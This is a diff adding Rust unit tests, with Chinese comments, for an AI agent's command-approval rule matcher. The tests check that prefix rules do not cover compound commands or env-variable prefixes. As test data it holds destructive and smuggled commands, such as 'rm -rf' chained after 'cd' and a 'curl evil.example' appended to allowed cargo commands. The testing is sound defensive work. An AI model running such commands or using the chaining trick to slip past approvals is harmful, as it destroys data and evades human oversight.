@@ -247,3 +247,199 @@ fn resolve_rules_path_lands_in_workspace_config() {
             .ends_with("/ws/config/approval_rules.json")
     );
 }
+
+// ---------- CMD-12（2026-10-13）：复合命令盲区 ----------
+
+#[test]
+fn pattern_for_compound_command_refuses_rule() {
+    // 复合命令不构成前缀规则：单一 pattern 表达不了「全段命中」语义
+    assert_eq!(pattern_for("process_exec", "cd /tmp && rm -rf y"), "");
+    assert_eq!(pattern_for("process_spawn", "echo hi; kill -9 1"), "");
+    assert_eq!(pattern_for("process_exec", "a | tee x"), "");
+}
+
+#[test]
+fn pattern_for_single_segment_with_operators_inside_quotes_ok() {
+    // 引号内的 `&&` 是字面量 = 单段，照常归约
+    assert_eq!(
+        pattern_for("process_exec", "echo \"a && b\" --flag"),
+        "echo *"
+    );
+}
+
+#[test]
+fn matches_rule_prefix_does_not_cover_compound_tail() {
+    // 核心：`cd *` 不得罩住 `cd x && rm -rf y` 的删除段
+    assert!(!matches_rule(
+        "process_exec",
+        "cd *",
+        "process_exec",
+        "cd /tmp && rm -rf y"
+    ));
+    // 单段行为不变
+    assert!(matches_rule(
+        "process_exec",
+        "cd *",
+        "process_exec",
+        "cd /tmp"
+    ));
+    assert!(matches_rule(
+        "process_exec",
+        "cd *",
+        "process_exec",
+        "cd /tmp --flag"
+    ));
+    // 三段复合，首段命中、尾段不命中 → 不放
+    assert!(!matches_rule(
+        "process_exec",
+        "cargo *",
+        "process_exec",
+        "cargo build && cargo test && curl evil.example"
+    ));
+}
+
+#[test]
+fn matches_rule_all_segments_hit_is_allowed() {
+    // 全段命中（同族前缀规则）→ 放行语义成立
+    assert!(matches_rule(
+        "process_exec",
+        "cargo *",
+        "process_exec",
+        "cargo build && cargo test"
+    ));
+    // 重定向 `2>&1` 不切段：`cargo *` 照常罩住
+    assert!(matches_rule(
+        "process_exec",
+        "cargo *",
+        "process_exec",
+        "cargo build > log.txt 2>&1"
+    ));
+}
+
+#[test]
+fn matches_rule_nonexec_keeps_exact_semantics() {
+    // 非 exec 类不受分段影响：无 " *" 后缀走精确匹配（旧语义原样）
+    assert!(matches_rule(
+        "file_write",
+        "/tmp/a.txt",
+        "file_write",
+        "/tmp/a.txt"
+    ));
+    assert!(!matches_rule(
+        "file_write",
+        "/tmp/*",
+        "file_write",
+        "/tmp/a.txt"
+    ));
+}
+
+#[test]
+fn persist_compound_command_returns_honest_error() {
+    let dir = std::env::temp_dir().join(format!("approval_rules_cmd12_{}", std::process::id()));
+    std::fs::create_dir_all(&dir).unwrap();
+    let path = dir.join("approval_rules.json");
+    let err =
+        persist_auto_allow_rule(&path, "process_exec", "cd /tmp && rm -rf y", "HIGH").unwrap_err();
+    assert!(err.contains("compound command"), "honest error, got: {err}");
+    // 规则文件未落任何东西
+    assert!(!path.exists());
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+// ---------- env 前缀（闭环批 2026-10-13）：读侧剥离与写侧归约同语义 ----------
+
+#[test]
+fn matches_rule_strips_env_prefix_per_segment() {
+    // 写侧 pattern 永无 env 头（reduce_command 剥）；读侧不剥则
+    // `FOO=1 cargo test` 永远弹卡——ABAC 放行、审批记忆打扰的分叉。
+    assert!(matches_rule(
+        "process_exec",
+        "cargo test *",
+        "process_exec",
+        "FOO=1 cargo test --release"
+    ));
+    // 复合命令逐段剥：`RUST_LOG=x` 只属于左段
+    assert!(matches_rule(
+        "process_exec",
+        "cargo *",
+        "process_exec",
+        "RUST_LOG=debug cargo build && cargo test"
+    ));
+    // env 头不构成通配逃生：`FOO=1 rm x` 不得命中 `cargo *`
+    assert!(!matches_rule(
+        "process_exec",
+        "cargo *",
+        "process_exec",
+        "FOO=1 rm x"
+    ));
+    // 纯 env 无命令：剥后为空 → 不命中（不得借 env 头全放行）
+    assert!(!matches_rule(
+        "process_exec",
+        "cargo *",
+        "process_exec",
+        "FOO=1"
+    ));
+}
+
+#[test]
+fn matches_rule_exact_branch_strips_env_for_command_ops() {
+    // 手写裸 pattern（无 " *" 后缀）的 exec 防御性对齐：剥 env 头再比
+    assert!(matches_rule(
+        "process_exec",
+        "cargo build",
+        "process_exec",
+        "FOO=1 cargo build"
+    ));
+    // 非 exec 类 target 是路径/URL：env 剥离不适用（含 `=` 的路径不变形）
+    assert!(!matches_rule(
+        "file_write",
+        "/tmp/a=b.txt",
+        "file_write",
+        "/tmp/other.txt"
+    ));
+    assert!(matches_rule(
+        "file_write",
+        "/tmp/a=b.txt",
+        "file_write",
+        "/tmp/a=b.txt"
+    ));
+}
+
+// ---------- D12-5（2026-10-13 第 6 轮审计）：引号形 env 头两侧同源 ----------
+
+#[test]
+fn quoted_env_prefix_hits_reduced_rule() {
+    // 写侧 reduce_command 在 tokenize 后剥 env（引号已掉，`"FOO=1"` 判 env）；
+    // 读侧若在原串上剥，首 token 带引号判非 env → 剥不掉 → 规则永远弹卡。
+    assert_eq!(
+        pattern_for("process_exec", "\"FOO=1\" cargo test"),
+        "cargo test *"
+    );
+    assert!(matches_rule(
+        "process_exec",
+        "cargo test *",
+        "process_exec",
+        "\"FOO=1\" cargo test --release"
+    ));
+    // 精确臂同源：手写 pattern 与引号 env 头 target
+    assert!(matches_rule(
+        "process_exec",
+        "cargo build",
+        "process_exec",
+        "\"FOO=1\" cargo build"
+    ));
+    // 引号形 env 头不构成通配逃生
+    assert!(!matches_rule(
+        "process_exec",
+        "cargo *",
+        "process_exec",
+        "\"FOO=1\" rm x"
+    ));
+    // 手写 pattern 的引号/多余空白与 target 归一（token 向量比较）
+    assert!(matches_rule(
+        "process_exec",
+        "cargo   build",
+        "process_exec",
+        "cargo build"
+    ));
+}
